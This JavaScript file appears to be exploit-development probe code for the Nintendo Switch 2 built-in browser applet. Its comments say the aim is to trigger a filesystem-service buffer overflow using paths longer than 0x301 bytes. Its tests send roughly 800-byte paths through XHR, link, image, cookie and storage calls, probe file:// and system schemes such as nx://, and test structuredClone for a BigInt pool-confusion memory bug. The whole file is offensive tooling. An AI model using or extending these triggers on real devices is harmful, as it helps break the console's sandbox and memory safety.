// IPC + filesystem service probe
// Goal: find paths from JS to trigger filesystem IPC (for the 0x301-byte path overflow)
// The Switch 2 fs service has a buffer overflow when a path with a certain char sequence
// is longer than 0x301 bytes. If we can send such a path from JS, we might trigger it directly.
(function() {
'use strict';
var results = [];
var longPath = '/';
for (var i = 0; i < 80; i++) longPath += 'AAAA' + i.toString(16).padStart(2, '0') + '/';
// ~800+ bytes, well over 0x301 (769 bytes)

// Test 1: URL schemes that might trigger system IPC
try {
  var schemes = [
    'file:///vol/content/',
    'file:///vol/save/',
    'file:///vol/user/',
    'file:///sd/',
    'file:///atmosphere/',
    'file:///Nintendo/',
    'file:///tmp/',
    'file:///dev/',
    'file:///proc/',
    'qlaunch://',
    'shop://',
    'pctl://',
    'album://',
    'cabinet://',
    'friends://',
    'migration://',
    'LibraryAppletWeb://',
    'LibraryAppletAuth://'
  ];
  var r1 = {};
  for (var i = 0; i < schemes.length; i++) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', schemes[i], false);
      x.send();
      r1[schemes[i]] = {status: x.status, len: x.responseText.length, text: x.responseText.substring(0, 100)};
    } catch(e) {
      r1[schemes[i]] = 'err:' + e.message.substring(0, 50);
    }
  }
  results.push({name: 'url_schemes_xhr', data: r1});
} catch(e) {
  results.push({name: 'url_schemes_xhr', error: e.message.substring(0, 80)});
}

// Test 2: fetch() with various URLs
try {
  var fetchUrls = [
    'file:///vol/content/test',
    'file:///tmp/test',
    'http://127.0.0.1/',
    'http://127.0.0.1:80/',
    'http://127.0.0.1:8080/',
    'http://localhost/',
    'http://[::1]/',
    'http://0.0.0.0/'
  ];
  var fetchResults = {};
  var pending = fetchUrls.length;

  fetchUrls.forEach(function(u) {
    try {
      fetch(u, {mode: 'no-cors'}).then(function(r) {
        fetchResults[u] = {status: r.status, type: r.type, ok: r.ok};
        if (--pending === 0) results.push({name: 'fetch_urls', data: fetchResults});
      }).catch(function(e) {
        fetchResults[u] = 'err:' + String(e).substring(0, 50);
        if (--pending === 0) results.push({name: 'fetch_urls', data: fetchResults});
      });
    } catch(e) {
      fetchResults[u] = 'sync_err:' + e.message.substring(0, 40);
      pending--;
    }
  });
} catch(e) {
  results.push({name: 'fetch_urls', error: e.message.substring(0, 80)});
}

// Test 3: Long path via various methods (trigger 0x301 overflow)
try {
  var r3 = {};

  // Long path fetch
  try {
    var longUrl = 'file:///' + 'A'.repeat(800);
    var x = new XMLHttpRequest();
    x.open('GET', longUrl, false);
    x.send();
    r3.longXhr = {status: x.status, len: x.responseText.length};
  } catch(e) {
    r3.longXhr = e.message.substring(0, 60);
  }

  // Long path via link element
  try {
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'file:///' + 'B'.repeat(800) + '.css';
    document.head.appendChild(link);
    r3.longLink = 'injected';
    setTimeout(function() { link.remove(); }, 100);
  } catch(e) {
    r3.longLink = e.message.substring(0, 60);
  }

  // Long path via img
  try {
    var img = new Image();
    img.onerror = function() {};
    img.src = 'file:///' + 'C'.repeat(800) + '.png';
    r3.longImg = 'created';
  } catch(e) {
    r3.longImg = e.message.substring(0, 60);
  }

  results.push({name: 'long_path_tests', data: r3});
} catch(e) {
  results.push({name: 'long_path_tests', error: e.message.substring(0, 80)});
}

// Test 4: nx:// with long paths (we know nx:// triggers system handler)
try {
  var r4 = {};

  // nx:// with very long path (>0x301 bytes)
  try {
    var longNx = 'nx://web_applet/' + 'D'.repeat(800);
    var a = document.createElement('a');
    a.href = longNx;
    r4.nxLongHref = a.href.length;
  } catch(e) {
    r4.nxLong = e.message.substring(0, 60);
  }

  // Various nx:// sub-paths
  var nxPaths = [
    'nx://web_applet/exit',
    'nx://web_applet/close',
    'nx://web_applet/fetch',
    'nx://web_applet/fs',
    'nx://web_applet/file',
    'nx://web_applet/save',
    'nx://web_applet/load',
    'nx://web_applet/ipc',
    'nx://applet/exit',
    'nx://exit',
    'nx://home'
  ];

  r4.nxFetches = {};
  for (var i = 0; i < nxPaths.length; i++) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', nxPaths[i], false);
      x.send();
      r4.nxFetches[nxPaths[i]] = x.status;
    } catch(e) {
      r4.nxFetches[nxPaths[i]] = e.message.substring(0, 40);
    }
  }

  results.push({name: 'nx_paths', data: r4});
} catch(e) {
  results.push({name: 'nx_paths', error: e.message.substring(0, 80)});
}

// Test 5: Web Storage / cookie paths (might use fs service)
try {
  var r5 = {};

  // localStorage with long keys/values
  try {
    var longKey = 'K'.repeat(800);
    localStorage.setItem(longKey, 'test');
    r5.longKeyLS = localStorage.getItem(longKey) === 'test' ? 'ok' : 'mismatch';
    localStorage.removeItem(longKey);
  } catch(e) {
    r5.longKeyLS = e.message.substring(0, 60);
  }

  // Cookie with long path
  try {
    document.cookie = 'test=1;path=/' + 'E'.repeat(800);
    r5.longCookie = document.cookie.indexOf('test=1') >= 0 ? 'set' : 'not_set';
  } catch(e) {
    r5.longCookie = e.message.substring(0, 60);
  }

  // sessionStorage
  try {
    var longVal = 'V'.repeat(2000);
    sessionStorage.setItem('probe', longVal);
    r5.longSessionStorage = sessionStorage.getItem('probe').length;
    sessionStorage.removeItem('probe');
  } catch(e) {
    r5.longSessionStorage = e.message.substring(0, 60);
  }

  results.push({name: 'storage_paths', data: r5});
} catch(e) {
  results.push({name: 'storage_paths', error: e.message.substring(0, 80)});
}

// Test 6: Content Security Policy and origin info
try {
  var r6 = {};
  r6.origin = location.origin;
  r6.protocol = location.protocol;
  r6.hostname = location.hostname;
  r6.href = location.href;
  r6.ancestorOrigins = [];
  try {
    for (var i = 0; i < location.ancestorOrigins.length; i++)
      r6.ancestorOrigins.push(location.ancestorOrigins[i]);
  } catch(e) {}

  // Check meta CSP
  var metas = document.querySelectorAll('meta[http-equiv]');
  r6.metaCSP = [];
  for (var i = 0; i < metas.length; i++) {
    r6.metaCSP.push({equiv: metas[i].httpEquiv, content: metas[i].content});
  }

  // Check if we can access parent/opener
  r6.hasParent = window.parent !== window;
  r6.hasOpener = !!window.opener;
  r6.frames = window.frames.length;

  results.push({name: 'origin_info', data: r6});
} catch(e) {
  results.push({name: 'origin_info', error: e.message.substring(0, 80)});
}

// Test 7: Web Worker with file:// URL
try {
  var r7 = {};
  try {
    var w = new Worker('file:///vol/content/test.js');
    w.onerror = function(e) {
      r7.fileWorker = 'err:' + String(e.message || e).substring(0, 60);
    };
    r7.fileWorker = 'created';
    setTimeout(function() { w.terminate(); }, 500);
  } catch(e) {
    r7.fileWorker = 'throw:' + e.message.substring(0, 60);
  }

  // Worker with data: URL
  try {
    var code = 'self.postMessage({origin:self.location.origin,href:self.location.href})';
    var blob = new Blob([code], {type:'application/javascript'});
    var url = URL.createObjectURL(blob);
    var w2 = new Worker(url);
    w2.onmessage = function(e) {
      r7.blobWorker = e.data;
    };
    w2.onerror = function(e) {
      r7.blobWorker = 'err:' + String(e.message || e).substring(0, 60);
    };
    setTimeout(function() { w2.terminate(); URL.revokeObjectURL(url); }, 500);
  } catch(e) {
    r7.blobWorkerCreate = 'throw:' + e.message.substring(0, 60);
  }

  results.push({name: 'worker_probes', data: r7});
} catch(e) {
  results.push({name: 'worker_probes', error: e.message.substring(0, 80)});
}

// Test 8: iframe navigation to various schemes
try {
  var r8 = {};
  var testSchemes = [
    'about:blank',
    'about:srcdoc',
    'javascript:void(0)',
    'data:text/html,<h1>test</h1>',
    'blob:null/test'
  ];

  for (var i = 0; i < testSchemes.length; i++) {
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = testSchemes[i];
      document.body.appendChild(iframe);

      try {
        var iDoc = iframe.contentDocument || iframe.contentWindow.document;
        r8[testSchemes[i]] = {
          access: true,
          origin: iframe.contentWindow.location.origin,
          href: iframe.contentWindow.location.href.substring(0, 80)
        };
      } catch(e) {
        r8[testSchemes[i]] = {access: false, err: e.message.substring(0, 40)};
      }
      iframe.remove();
    } catch(e) {
      r8[testSchemes[i]] = 'throw:' + e.message.substring(0, 40);
    }
  }

  results.push({name: 'iframe_schemes', data: r8});
} catch(e) {
  results.push({name: 'iframe_schemes', error: e.message.substring(0, 80)});
}

// Test 9: Map/Set SC pool confusion (Bug 265975 also fixed Map/Set iterator issues)
try {
  var r9 = {};

  // Serialize a Map with BigInt confusion
  var buf9a = new ArrayBuffer(32);
  new Uint8Array(buf9a).fill(0xAA);
  var buf9b = new ArrayBuffer(32);
  new Uint8Array(buf9b).fill(0xBB);

  var map9 = new Map();
  map9.set('key1', buf9a);
  map9.set('key2', buf9b);

  // SC with BigInt shift: [1n, map9]
  // The Map's internal entries might have pool references that shift
  var arr9 = [1n, map9];
  try {
    var clone9 = structuredClone(arr9);
    var cloneMap = clone9[1];
    if (cloneMap instanceof Map) {
      var v1 = cloneMap.get('key1');
      var v2 = cloneMap.get('key2');
      r9.mapClone = {
        isMap: true,
        size: cloneMap.size,
        v1Type: v1 ? v1.constructor.name : 'null',
        v2Type: v2 ? v2.constructor.name : 'null',
        v1Len: v1 && v1.byteLength !== undefined ? v1.byteLength : 'N/A',
        v2Len: v2 && v2.byteLength !== undefined ? v2.byteLength : 'N/A'
      };
      // Check if the buffers got confused
      if (v1 instanceof ArrayBuffer) {
        r9.v1Data = new Uint8Array(v1)[0];
      }
      if (v2 instanceof ArrayBuffer) {
        r9.v2Data = new Uint8Array(v2)[0];
      }
      // Check if v1 === v2 (pool aliasing)
      r9.aliased = v1 === v2;
    } else {
      r9.mapClone = {isMap: false, type: typeof cloneMap};
    }
  } catch(e) {
    r9.mapCloneErr = e.message.substring(0, 60);
  }

  // Map with object keys — more interesting for pool confusion
  var obj9a = {marker: 'alpha'};
  var obj9b = {marker: 'beta'};
  var map9b = new Map();
  map9b.set(obj9a, 'val_a');
  map9b.set(obj9b, 'val_b');

  var arr9b = [1n, obj9a, obj9b, map9b];
  try {
    var clone9b = structuredClone(arr9b);
    var cloneMap2 = clone9b[3];
    r9.mapObjKeys = {
      isMap: cloneMap2 instanceof Map,
      size: cloneMap2.size,
      entries: []
    };
    cloneMap2.forEach(function(v, k) {
      r9.mapObjKeys.entries.push({
        keyType: typeof k,
        keyMarker: k && k.marker,
        val: v
      });
    });
    // Check if BigInt shifted the key references
    r9.mapObjKeys.key0SameAsArr1 = false;
    var iter = cloneMap2.keys();
    var k0 = iter.next().value;
    r9.mapObjKeys.key0Marker = k0 && k0.marker;
    r9.mapObjKeys.key0IsObj1 = k0 === clone9b[1];
    r9.mapObjKeys.key0IsObj2 = k0 === clone9b[2];
  } catch(e) {
    r9.mapObjKeysErr = e.message.substring(0, 60);
  }

  // Set with BigInt confusion
  var set9 = new Set();
  set9.add(buf9a);
  set9.add(buf9b);
  var arr9c = [1n, set9];
  try {
    var clone9c = structuredClone(arr9c);
    var cloneSet = clone9c[1];
    r9.setClone = {
      isSet: cloneSet instanceof Set,
      size: cloneSet.size
    };
    var setVals = [];
    cloneSet.forEach(function(v) {
      setVals.push({type: v ? v.constructor.name : 'null', len: v && v.byteLength !== undefined ? v.byteLength : 'N/A'});
    });
    r9.setClone.values = setVals;
  } catch(e) {
    r9.setCloneErr = e.message.substring(0, 60);
  }

  results.push({name: 'map_set_sc', data: r9});
} catch(e) {
  results.push({name: 'map_set_sc', error: e.message.substring(0, 80)});
}

// Test 10: postMessage to self — another SC path
try {
  var r10 = {};
  var buf10a = new ArrayBuffer(16);
  new Uint8Array(buf10a).fill(0xCC);
  var buf10b = new ArrayBuffer(16);
  new Uint8Array(buf10b).fill(0xDD);
  var view10 = new Uint8Array(buf10b);

  // postMessage uses SC internally
  var received = false;
  window.addEventListener('message', function handler(e) {
    if (e.data && e.data.__probe10) {
      received = true;
      window.removeEventListener('message', handler);
      var d = e.data;
      r10.received = true;
      r10.bigint = typeof d.items[0] === 'bigint' ? d.items[0].toString() : typeof d.items[0];
      if (d.items[2] instanceof Uint8Array) {
        r10.viewLen = d.items[2].length;
        r10.viewBufLen = d.items[2].buffer.byteLength;
        r10.viewByte0 = d.items[2][0];
        r10.viewBufSame = d.items[2].buffer === d.items[1];
      } else {
        r10.viewResult = d.items[2] === null ? 'null' : typeof d.items[2];
      }
    }
  });

  window.postMessage({
    __probe10: true,
    items: [1n, buf10a, view10]
  }, '*');

  // Give time for message delivery
  setTimeout(function() {
    if (!received) r10.timeout = true;
    results.push({name: 'postmessage_sc', data: r10});
  }, 500);
} catch(e) {
  results.push({name: 'postmessage_sc', error: e.message.substring(0, 80)});
}

// Test 11: Check for IPC-related APIs
try {
  var r11 = {};
  r11.BroadcastChannel = typeof BroadcastChannel;
  r11.MessageChannel = typeof MessageChannel;
  r11.MessagePort = typeof MessagePort;
  r11.RTCPeerConnection = typeof RTCPeerConnection;
  r11.webkitRTCPeerConnection = typeof webkitRTCPeerConnection;
  r11.Notification = typeof Notification;
  r11.PushManager = typeof PushManager;
  r11.PaymentRequest = typeof PaymentRequest;
  r11.Credential = typeof Credential;
  r11.PasswordCredential = typeof PasswordCredential;
  r11.FederatedCredential = typeof FederatedCredential;
  r11.PublicKeyCredential = typeof PublicKeyCredential;
  r11.USB = typeof navigator.usb;
  r11.Bluetooth = typeof navigator.bluetooth;
  r11.Serial = typeof navigator.serial;
  r11.HID = typeof navigator.hid;
  r11.NDEFReader = typeof NDEFReader;
  r11.Gamepad = typeof Gamepad;
  r11.getGamepads = typeof navigator.getGamepads;
  r11.getBattery = typeof navigator.getBattery;
  r11.vibrate = typeof navigator.vibrate;
  r11.share = typeof navigator.share;
  r11.clipboard = typeof navigator.clipboard;
  r11.permissions = typeof navigator.permissions;
  r11.mediaDevices = typeof navigator.mediaDevices;
  r11.xr = typeof navigator.xr;

  results.push({name: 'ipc_apis', data: r11});
} catch(e) {
  results.push({name: 'ipc_apis', error: e.message.substring(0, 80)});
}

// Test 12: Can we create Blob URLs and navigate iframes to them with long paths?
try {
  var r12 = {};

  // Create a blob with a script that tries file:// access
  var blobCode = '<script>try{var x=new XMLHttpRequest();x.open("GET","file:///vol/",false);x.send();parent.postMessage({fileAccess:true,len:x.responseText.length},"*")}catch(e){parent.postMessage({fileAccess:false,err:e.message.substring(0,60)},"*")}<\/script>';
  var blob = new Blob([blobCode], {type: 'text/html'});
  var blobUrl = URL.createObjectURL(blob);

  var iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = blobUrl;

  window.addEventListener('message', function handler(e) {
    if (e.data && e.data.fileAccess !== undefined) {
      r12.blobIframeFileAccess = e.data;
      window.removeEventListener('message', handler);
    }
  });

  document.body.appendChild(iframe);
  r12.blobUrl = blobUrl.substring(0, 40);

  setTimeout(function() {
    iframe.remove();
    URL.revokeObjectURL(blobUrl);
    results.push({name: 'blob_file_access', data: r12});
  }, 1000);
} catch(e) {
  results.push({name: 'blob_file_access', error: e.message.substring(0, 80)});
}

return new Promise(function(resolve) {
  setTimeout(function() {
    resolve(JSON.stringify(results));
  }, 3000);
});
})();
